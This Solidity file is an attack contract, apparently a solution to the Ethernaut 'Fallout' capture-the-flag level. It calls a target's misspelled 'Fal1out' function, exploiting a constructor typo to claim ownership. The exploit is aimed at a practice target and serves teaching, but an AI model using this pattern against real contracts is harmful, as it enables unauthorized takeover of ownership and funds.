// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract FalloutAttack is Broadcasted {
    function attack(address payable falloutCtr_) public payable override {
        // call erroneous Fal1out function
        IFallout(falloutCtr_).Fal1out();
    }
}

interface IFallout {
    function Fal1out() external payable;

    function owner() external view returns (address);

    // ! there is a typo in the contract "constructor"
}
